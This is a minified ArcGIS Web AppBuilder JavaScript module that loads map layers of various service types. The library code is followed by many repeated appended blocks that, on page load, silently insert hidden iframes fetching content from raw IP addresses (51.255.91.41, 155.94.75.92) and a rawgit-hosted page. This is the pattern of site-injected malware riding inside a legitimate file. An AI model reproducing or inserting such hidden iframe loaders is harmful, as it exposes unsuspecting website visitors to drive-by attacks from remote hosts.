// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/promise/all dojo/Deferred dojo/json dojo/i18n!../nls/strings ./util esri/lang esri/request esri/arcgis/utils esri/layers/ArcGISDynamicMapServiceLayer esri/layers/ArcGISImageServiceLayer esri/layers/ArcGISTiledMapServiceLayer esri/layers/DynamicLayerInfo esri/layers/FeatureLayer esri/layers/ImageParameters esri/layers/ImageServiceParameters esri/layers/KMLLayer esri/layers/LayerDrawingOptions esri/layers/MosaicRule esri/layers/RasterFunction esri/layers/VectorTileLayer esri/layers/WMSLayer esri/dijit/PopupTemplate esri/InfoTemplate esri/renderers/jsonUtils jimu/utils".split(" "),
function(x,r,m,t,l,p,u,y,f,n,z,A,B,C,D,v,E,F,G,H,I,J,K,L,w,M,N,O){return x(null,{item:null,itemUrl:null,map:null,serviceUrl:null,constructor:function(a){r.mixin(this,a)},addItem:function(a,b){var c=new l;this.map=b;this.item=a;this.itemUrl=this._checkMixedContent(a.itemUrl);this.serviceUrl=this._checkMixedContent(a.url);if("Feature Service"===a.type)return this._addFeatureService();if("Image Service"===a.type)return this._addImageService();if("KML"===a.type)return this._addKML();if("Map Service"===
a.type)return this._addMapService();if("Vector Tile Service"===a.type)return this._addVectorTileService();if("WMS"===a.type)return this._addWMS();console.warn("Unsupported item type: ",a.type);c.resolve(null);return c},_addFeatureService:function(){var a=this,b=new l,c=this.serviceUrl,e=this.item,d={},h=null,k=[],g=[];a._readItemJsonData().then(function(b){(d=b||{},d.layers)&&0<d.layers.length&&m.forEach(d.layers,function(a){"undefined"!==typeof a.id&&null!==a.id&&(null===h&&(h=[]),h.push(a.id))});
return a._readRestInfo(c)}).then(function(b){b&&"string"===typeof b.type&&"Feature Layer"===b.type?(b=new v(c,{id:a._generateLayerId(),outFields:["*"]}),k.push(a._waitForLayer(b))):b&&b.layers&&0<b.layers.length&&m.forEach(b.layers,function(b){var d=!0;null!==h&&0<h.length&&(d=m.some(h,function(a){return a===b.id}));d&&(d=new v(c+"/"+b.id,{id:a._generateLayerId(),outFields:["*"]}),k.push(a._waitForLayer(d)))});return t(k)}).then(function(a){m.forEach(a,function(a){g.push(a)});g.reverse();return g}).then(function(){m.forEach(g,
function(b){var c=a._processFeatureLayer(b,e,d);b.arcgisProps={title:c.title};b._titleForLegend=c.title;f.isDefined(b.title)||(b.title=c.title);a._addLayer(b)})}).then(function(){b.resolve(g)}).otherwise(function(a){b.reject(a)});return b},_addImageService:function(){var a=this,b=new l;a._readItemJsonData().then(function(b){return a._newImageServiceLayer(b||{})}).then(function(c){a._addLayer(c);b.resolve(c)}).otherwise(function(a){b.reject(a)});return b},_addKML:function(){var a=this,b=new l;a._newKMLLayer().then(function(c){c&&
(c.title=a.item.title);a._addLayer(c);b.resolve(c)}).otherwise(function(a){b.reject(a)});return b},_addMapService:function(){var a=this,b=new l;a._readItemJsonData().then(function(b){return a._newMapServiceLayer(b||{})}).then(function(c){a._addLayer(c);b.resolve(c)}).otherwise(function(a){b.reject(a)});return b},_addVectorTileService:function(){var a=this,b=new l;a._newVectorTileLayer().then(function(c){a._addLayer(c);b.resolve(c)}).otherwise(function(a){b.reject(a)});return b},_addWMS:function(){var a=
this,b=new l;a._readItemJsonData().then(function(b){return a._newWMSLayer(b||{})}).then(function(c){c&&(c.title=a.item.title);a._addLayer(c);b.resolve(c)}).otherwise(function(a){b.reject(a)});return b},_addLayer:function(a){var b=this.item;a&&(a.xtnItemId=b.id,a.xtnAddData=!0,!a.arcgisProps&&b&&(a.arcgisProps={title:b.title},a._titleForLegend=b.title),f.isDefined(a.title)||(a.title=b.title),a._wabProperties={itemLayerInfo:{itemId:b.id,itemUrl:this.itemUrl,portalUrl:b.portalUrl}},this.map.addLayer(a))},
_checkMixedContent:function(a){return y.checkMixedContent(a)},_checkUrl:function(a){return z._checkUrl(a)},_checkVectorTileUrl:function(a,b){var c=new l;if(function(a,b){return-1!==a.indexOf(b,a.length-b.length)}(a,".json"))return b.styleUrl=a,c.resolve(a),c;var e={url:null,content:{},handleAs:"json",callbackParamName:"callback"};this.itemUrl?(e.url=this.itemUrl+"/resources/styles/root.json",n(e,{}).then(function(){b.styleUrl=e.url;c.resolve(e.url)}).otherwise(function(){e.url=a+"/resources/styles/root.json";
n(e,{}).then(function(){b.styleUrl=e.url;c.resolve(e.url)}).otherwise(function(){b.url=a;c.resolve(a)})})):(e.url=a+"/resources/styles/root.json",n(e,{}).then(function(){b.styleUrl=e.url;c.resolve(e.url)}).otherwise(function(){b.url=a;c.resolve(a)}));return c},_generateLayerId:function(){return this._generateLayerIds(1)[0]},_generateLayerIds:function(a){var b,c=[];for(b=0;b<a;b++)c.push(this._generateRandomId());return c},_generateRandomId:function(){var a=null,a="function"===typeof Date.now?Date.now():
(new Date).getTime(),b=(""+Math.random()).replace("0.","r");return(a+""+b).replace(/-/g,"")},_makeFeatureLayerTitle:function(a,b,c){var e,d,h;try{if(b&&c&&b===c||b&&c&&(e=c.indexOf(b),0===e&&(d=c.substring(e+b.length+1),13<=d.length&&(h=/^\d+$/,h.test(d)))))return b}catch(k){}return a.replace("{serviceName}",b).replace("{layerName}",c)},_newImageServiceLayer:function(a){var b=new l,c=this._generateLayerId(),e=this.serviceUrl,d={mapLayerId:c,bandIds:null,format:null,compressionQuality:null,opacity:1,
visibility:!0};f.isDefined(a.visibility)&&!1===a.visibility&&(d.visibility=!1);f.isDefined(a.opacity)&&(d.opacity=a.opacity);f.isDefined(a.minScale)&&!f.isDefined(d.minScale)&&(d.minScale=a.minScale);f.isDefined(a.maxScale)&&!f.isDefined(d.maxScale)&&(d.maxScale=a.maxScale);f.isDefined(a.refreshInterval)&&!f.isDefined(d.refreshInterval)&&(d.refreshInterval=a.refreshInterval);!a.popupInfo||d.popupInfo||d.disablePopup||(d.popupInfo=a.popupInfo);a.renderingRule&&!d.renderingRule&&(d.renderingRule=a.renderingRule,
a.renderingRule.functionName&&(d.renderingRule.rasterFunction=a.renderingRule.functionName));a.bandIds&&!d.bandIds&&(d.bandIds=a.bandIds);a.mosaicRule&&!d.mosaicRule&&(d.mosaicRule=a.mosaicRule);a.format&&!d.format&&(d.format=a.format);f.isDefined(a.compressionQuality)&&!f.isDefined(d.compressionQuality)&&(d.compressionQuality=a.compressionQuality);!a.layerDefinition||!a.layerDefinition.definitionExpression||f.isDefined(d.layerDefinition)&&f.isDefined(d.layerDefinition.definitionExpression)||(d.layerDefinition=
d.layerDefinition||{},d.layerDefinition.definitionExpression=a.layerDefinition.definitionExpression);a=new F;null!==d.bandIds&&(a.bandIds=d.bandIds);null!==d.format&&(a.format=d.format,null!==d.compressionQuality&&(a.compressionQuality=d.compressionQuality));d.renderingRule&&d.renderingRule.rasterFunction&&(c=new J(d.renderingRule),a.renderingRule=c);d.mosaicRule&&(c=new I(d.mosaicRule),a.mosaicRule=c);f.isDefined(d.noData)&&(a.noData=d.noData);f.isDefined(d.noDataInterpretation)&&(a.noDataInterpretation=
d.noDataInterpretation);f.isDefined(d.interpolation)&&(a.interpolation=d.interpolation);a={imageServiceParameters:a,opacity:d.opacity,visible:d.visibility};f.isDefined(d.mapLayerId)&&(a.id=d.mapLayerId);f.isDefined(d.minScale)&&(a.minScale=d.minScale);f.isDefined(d.maxScale)&&(a.maxScale=d.maxScale);f.isDefined(d.refreshInterval)&&(a.refreshInterval=d.refreshInterval);f.isDefined(d.resourceInfo)&&(a.resourceInfo=d.resourceInfo);e=new B(this._checkUrl(e),a);this._waitForLayer(e).then(function(a){d.layerDefinition&&
d.layerDefinition.definitionExpression&&a.setDefinitionExpression(d.layerDefinition.definitionExpression,!0);b.resolve(a)},function(a){b.reject(a)});return b},_newInfoTemplate:function(a,b){if(a)try{return new w({description:a.description,title:a.title,showAttachments:a.showAttachments,fieldInfos:a.fieldInfos,mediaInfos:a.mediaInfos})}catch(c){console.error(c)}a=new M;f.isDefined(b)&&a.setTitle(b);return a},_newKMLLayer:function(){var a={id:this._generateLayerId()},a=new G(this.serviceUrl,a);return this._waitForLayer(a)},
_newMapServiceLayer:function(a){var b=this,c=new l,e=this.serviceUrl,d=this._generateLayerId();n({url:e,content:{f:"json"},handleAs:"json",callbackParamName:"callback"},{}).then(function(h){var k=null,k={id:d};if(h.tileInfo)k=new C(e,k);else if(h&&h.supportedImageFormatTypes&&-1!==h.supportedImageFormatTypes.indexOf("PNG32")&&(k.imageParameters=new E,k.imageParameters.format="png32"),k=new A(e,k),a&&a.layers&&0<a.layers.length){var g=[],f,l=[],n,p=[],q;m.forEach(a.layers,function(b){b.layerDefinition&&
b.layerDefinition.definitionExpression&&(g[b.id]=b.layerDefinition.definitionExpression);if(b.layerDefinition&&b.layerDefinition.source){f=null;q=b.layerDefinition.source;if("mapLayer"===q.type){var d=m.filter(h.layers,function(a){return a.id===q.mapLayerId});d.length&&(f=r.mixin(d[0],b))}else f=r.mixin({},b);f&&(f.source=q,delete f.popupInfo,f=new D(f),a.visibleLayers&&(d="string"===typeof a.visibleLayers?a.visibleLayers.split(","):a.visibleLayers,-1<m.indexOf(d,b.id)?f.defaultVisibility=!0:f.defaultVisibility=
!1),l.push(f))}b.layerDefinition&&b.layerDefinition.source&&b.layerDefinition.drawingInfo&&(n=new H(b.layerDefinition.drawingInfo),p[b.id]=n)});0<g.length&&k.setLayerDefinitions(g);0<l.length&&(k.setDynamicLayerInfos(l,!0),0<p.length&&k.setLayerDrawingOptions(p,!0))}b._waitForLayer(k).then(function(d){var e=null;m.forEach(d.layerInfos,function(d){var c=null;a&&m.some(a.layers,function(a){if(d.id===a.id)return c=a,!0});var f=null;c&&c.popupInfo&&(f=c.popupInfo);f&&(null===e&&(e={}),e[d.id]={infoTemplate:b._newInfoTemplate(f,
d.name)})});null===d.infoTemplates&&(e?d.infoTemplates=e:b._setDynamicLayerInfoTemplates(d));c.resolve(d)},function(a){c.reject(a)})},function(a){c.reject(a)});return c},_getVisibleFeatureLayers:function(a,b){if(!a||!b||0===b.length)return[];b=","+b+",";var c=[],e,d=",";for(e=0;e<a.length;e++)if(null!==a[e].subLayerIds){if(-1===b.indexOf(","+a[e].id+",")||-1<d.indexOf(","+a[e].id+","))d+=a[e].subLayerIds.toString()+","}else-1<b.indexOf(","+a[e].id+",")&&-1===d.indexOf(","+a[e].id+",")&&c.push(a[e].id);
return c},_newPopupInfo:function(a,b){if(a&&a.fields){var c={title:a.name,fieldInfos:[],description:null,showAttachments:!0,mediaInfos:[]};"string"===typeof b&&0<b.length&&(c.title=b);m.forEach(a.fields,function(a){var b=O.getDefaultPortalFieldInfo(a);b.visible=!0;b.isEditable=a.editable;c.fieldInfos.push(b)});return c}return null},_newVectorTileLayer:function(){var a=this,b=new l,c={},e=this.serviceUrl,d=this._generateLayerId();"string"===typeof e&&0<e.length?this._checkVectorTileUrl(e,c).then(function(c){"string"===
typeof c&&0<c.length?(c=a._checkMixedContent(c),c=new K(c,{id:d,opacity:1,visible:!0}),a._waitForLayer(c).then(function(a){b.resolve(a)},function(a){b.reject(a)})):b.resolve(null)},function(a){b.reject(a)}):b.resolve(null);return b},_newWMSLayer:function(){var a={id:this._generateLayerId()},a=new L(this.serviceUrl,a),b=this,a=this._waitForLayer(a);a.then(function(a){b._setWMSVisibleLayers(a)});return a},_processFeatureLayer:function(a,b,c){var e=this,d=u.search.featureLayerTitlePattern,h=null;c&&
c.layers&&0<c.layers.length?m.some(c.layers,function(c){var g,k,l,m=!1;if(c.id===a.layerId){c.popupInfo&&(g=c.popupInfo,g=p.parse(p.stringify(g)),g=new w(g),a.setInfoTemplate(g),m=!0);f.isDefined(c.showLabels)&&a.setShowLabels(c.showLabels);f.isDefined(c.refreshInterval)&&a.setRefreshInterval(c.refreshInterval);f.isDefined(c.showLegend)&&console.log("");f.isDefined(c.timeAnimation)&&!1===c.timeAnimation&&console.log("");if(g=c.layerDefinition)g.definitionExpression&&a.setDefinitionExpression(g.definitionExpression),
g.displayField&&a.displayField(g.displayField),g.drawingInfo&&(g.drawingInfo.renderer&&(k=p.parse(p.stringify(g.drawingInfo.renderer)),l=N.fromJson(k),k.type&&"classBreaks"===k.type&&(l.isMaxInclusive=!0),a.setRenderer(l)),f.isDefined(g.drawingInfo.transparency)&&a.setOpacity(1-g.drawingInfo.transparency/100)),f.isDefined(g.minScale)&&a.setMinScale(g.minScale),f.isDefined(g.maxScale)&&a.setMaxScale(g.maxScale),f.isDefined(g.defaultVisibility)&&!1===g.defaultVisibility&&a.setVisibility(!1);m||e._setFeatureLayerInfoTemplate(a,
c.popupInfo);h={url:a.url,id:a.id,itemId:b.id,title:e._makeFeatureLayerTitle(d,b.title,a.name)};return!0}}):(h={url:a.url,id:a.id,itemId:b.id,title:e._makeFeatureLayerTitle(d,b.title,a.name)},e._setFeatureLayerInfoTemplate(a,null,h.title));return h},_readItemJsonData:function(){return n({url:this.itemUrl+"/data",content:{f:"json"},handleAs:"json"},{})},_readRestInfo:function(a){return n({url:a,content:{f:"json"},handleAs:"json",callbackParamName:"callback"},{})},_setDynamicLayerInfoTemplates:function(a){var b=
this,c=null,e=[],d=function(d){var e=b._readRestInfo(a.url+"/"+d.id);e.then(function(a){try{var e=b._newPopupInfo(a);e&&(c[d.id]={infoTemplate:b._newInfoTemplate(e)})}catch(P){console.warn("Error setting popup."),console.error(P)}});return e};null===a.infoTemplates&&m.forEach(a.layerInfos,function(a){null===c&&(c={});a.subLayerIds||e.push(d(a))});0<e.length&&t(e).then(function(){c&&(a.infoTemplates=c)}).otherwise(function(a){console.warn("Error reading sublayers.");console.error(a)})},_setFeatureLayerInfoTemplate:function(a,
b,c){b||(b=this._newPopupInfo(a,c));b=this._newInfoTemplate(b,c);a.setInfoTemplate(b)},_setWMSVisibleLayers:function(a){var b=[];a&&(m.some(a.layerInfos,function(a){if("string"===typeof a.name&&0<a.name.length)if(10>b.length)b.push(a.name);else return!0}),10>=b.length&&a.setVisibleLayers(b))},_waitForLayer:function(a){var b=new l,c=[];if(a.loaded)return b.resolve(a),b;if(a.loadError)return b.reject(a.loadError),b;var e=function(){m.forEach(c,function(a){a.remove()})};c.push(a.on("load",function(a){e();
b.resolve(a.layer)}));c.push(a.on("error",function(a){e();a=a.error;try{a.message&&-1!==a.message.indexOf("Unable to complete")?(console.warn("layerAccessError",a),b.reject(Error(u.search.layerInaccessible))):b.reject(a)}catch(h){b.reject(a)}}));return b}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});